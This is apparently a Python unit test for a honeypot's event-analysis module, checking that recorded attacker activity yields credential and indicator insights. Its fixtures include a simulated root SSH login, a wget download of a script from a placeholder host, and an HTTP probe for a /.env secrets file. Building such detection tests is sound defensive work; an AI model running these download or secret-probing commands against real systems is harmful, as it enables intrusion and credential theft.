import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from honeypot.analyze import build_insights, summarize  # noqa: E402
from honeypot.events import new_event  # noqa: E402


def _event(**kwargs):
    base = dict(
        session_id="s",
        service="ssh",
        event_type="command",
        src_ip="127.0.0.1",
        src_port=1,
        dst_port=2222,
        summary="x",
    )
    base.update(kwargs)
    return new_event(**base)


class AnalyzeTests(unittest.TestCase):
    def test_insights_call_out_credentials_and_indicators(self):
        events = [
            _event(event_type="auth_attempt", service="ssh", summary="ssh login root", username="root", password="training-only", status="accepted", command=None),
            _event(command="uname -a", summary="uname -a"),
            _event(command="wget http://example.invalid/lab-decoy.sh", summary="wget http://example.invalid/lab-decoy.sh"),
            _event(service="http", event_type="http_request", command="GET", path="/.env", summary="GET /.env"),
        ]
        summary = summarize(events)
        self.assertEqual(summary["auth_accepted"], 1)
        self.assertEqual(summary["indicators"][0]["value"], "http://example.invalid/lab-decoy.sh")
        text = " ".join(build_insights(summary))
        self.assertIn("example.invalid", text)
        self.assertIn("decoy", text.lower())


if __name__ == "__main__":
    unittest.main()
